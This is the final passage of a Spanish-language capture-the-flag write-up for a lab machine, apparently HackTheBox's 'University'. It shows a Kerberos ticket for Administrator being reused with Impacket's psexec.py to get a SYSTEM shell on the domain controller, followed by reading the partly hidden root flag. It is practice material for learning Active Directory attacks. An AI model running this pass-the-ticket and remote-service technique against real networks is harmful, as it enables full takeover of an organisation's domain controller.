[*] Saving ticket in Administrator@CIFS_DC.university.htb@UNIVERSITY.HTB.ccache
~~~


## Root Time

Utilizaremos el ticket en la variable `KRB5CCNAME` para autenticarnos al Domain Controller, en mi caso he utilizado `psexec`

~~~ bash
KRB5CCNAME=Administrator@CIFS_DC.university.htb@UNIVERSITY.HTB.ccache psexec.py -k -no-pass university.htb/Administrator@DC.university.htb
Impacket v0.13.0.dev0+20250109.91705.ac02e0ee - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on DC.university.htb.....
[*] Found writable share ADMIN$
[*] Uploading file fBLVNegn.exe
[*] Opening SVCManager on DC.university.htb.....
[*] Creating service AvCo on DC.university.htb.....
[*] Starting service AvCo.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.6414]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami 
nt authority\system
~~~

Ahora nos queda ver la flag para completar la máquina

~~~ bash
C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt 
06f...
~~~
<br>
Gracias por leer este artículo, espero te haya sido de ayuda. Te dejo la cita del día:

> There are only two ways to live your life. One is as though nothing is a miracle. The other is as though everything is a miracle.
> — Albert Einstein
{: .notice--info}
